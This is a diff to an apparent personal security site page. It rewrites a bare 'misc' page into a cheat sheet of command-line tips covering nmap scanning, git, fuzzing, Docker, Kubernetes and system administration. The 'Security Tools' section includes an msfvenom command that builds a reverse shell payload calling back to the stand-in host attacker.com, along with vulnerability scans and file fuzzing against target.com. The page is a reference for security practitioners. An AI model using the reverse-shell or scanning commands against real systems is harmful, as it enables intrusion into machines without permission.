@@ -1,12 +1,12 @@
 ---
-title: misc
+title: CLI Tips & Tricks
 layout: default
 permalink: /misc/
 ---
 
 <div class="home">
   <div class="page-heading">
-    <h2 class="page-title">nmap</h2>
+    <h2 class="page-title">Command Line Arsenal</h2>
   </div>
   <div class="about">
     <div class="container-face">
@@ -14,14 +14,110 @@ permalink: /misc/
     </div>
     <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
     <div class="about-description">
-      <p>Handy Commands</p>
-      <br><br>
-      
+      <p>A collection of handy CLI commands and tricks for security professionals</p>
     </div>
+
+    <div class="command-section">
+      <h3>🔍 Nmap Techniques</h3>
+      <pre><code># Fast scan of top 1000 ports
+nmap -F -T4 target.com
+
+# Full port scan with service detection
+nmap -p- -sV target.com
+
+# Aggressive scan with OS detection, version detection, script scanning, and traceroute
+nmap -A target.com
+
+# Scan through proxychains
+proxychains nmap -sT -Pn target.com
+
+# Scan for specific vulnerabilities 
+nmap --script vuln target.com
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🐙 Git Operations</h3>
+      <pre><code># Use specific SSH key for git operations
+GIT_SSH_COMMAND="ssh -i ~/.ssh/id_rsa_example" git clone git@github.com:user/repo.git
+
+# Clone specific branch only with limited depth
+git clone --single-branch --branch dev --depth 1 https://github.com/user/repo.git
+
+# Fix your last commit message
+git commit --amend -m "New commit message"
+
+# Unstage all staged files
+git reset HEAD
+
+# Interactive rebase for cleaning up commits
+git rebase -i HEAD~5
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🛡️ Security Tools</h3>
+      <pre><code># Set up a simple HTTP server for file transfers
+python3 -m http.server 8000
+
+# Find sensitive files in web directories
+ffuf -w /path/to/wordlist -u https://target.com/FUZZ -e .bak,.swp,.old
+
+# Check SSL/TLS configuration
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# Generate reverse shell payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f elf > shell
+
+# Extract endpoints from JavaScript files
+grep -r "url\|href\|action\|path\|endpoint" --include="*.js" /path/to/js/files
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🐳 Docker & Kubernetes</h3>
+      <pre><code># List all running containers with ports
+docker ps --format "{{.ID}}\t{{.Names}}\t{{.Ports}}"
+
+# Get a shell in a running container
+docker exec -it container_name /bin/bash
+
+# Clean up all unused Docker resources
+docker system prune -a
+
+# Kubernetes: Forward local port to pod
+kubectl port-forward pod/pod-name 8080:80
+
+# Get logs from all pods with a specific label
+kubectl logs -l app=nginx --all-containers
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🔧 System Administration</h3>
+      <pre><code># Find files modified in the last 24 hours
+find /path/to/search -type f -mtime -1
+
+# Monitor incoming and outgoing network connections
+watch -n 1 "netstat -tunapl | grep ESTABLISHED"
+
+# Find largest directories
+du -h --max-depth=1 | sort -hr
+
+# Securely erase free space
+dd if=/dev/zero of=zero.fill bs=1M; sync; rm -f zero.fill
+
+# Monitor system resource usage
+htop --sort-key PERCENT_CPU
+</code></pre>
+    </div>
+
     <div class="contact-contaiver">
-      <p>GIT_SSH_COMMAND="ssh -i ~/.ssh/id_rsa_example" go install</p>
-      <br><br>
+      <h3>📚 Additional Resources</h3>
+      <p>For more detailed Nmap techniques, check out my gist:</p>
       <script src="https://gist.github.com/random-robbie/d356f7775d17efb57d03de0836c7f3d5.js"></script>
+      
+      <p>Have a useful command to share? <a href="mailto:contact@what-security.co.uk">Send it to me!</a></p>
     </div>
   </div>
 </div>
